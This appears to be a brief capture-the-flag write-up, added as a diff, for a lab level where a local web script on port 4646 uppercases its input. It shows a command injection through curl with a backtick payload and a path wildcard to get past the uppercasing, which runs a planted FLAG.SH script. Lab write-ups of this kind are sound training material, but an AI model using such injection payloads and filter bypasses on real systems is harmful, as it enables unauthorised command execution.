@@ -1,0 +1,7 @@
+In root directory there is a file that show there is a server running on port 4646.
+The script change the character to uppercase, so we can't manage to inject a to use getflag directly.
+So we will create a script called FLAG.SH in that we call getflag and redirect the result to flag12.
+chmod 777 FLAG.SH
+Using wild card, otherwise tmp would have been TMP
+curl localhost:4646?x="\`/*/flag.sh\`"
+Then we can get the flag with cat /tmp/flag12
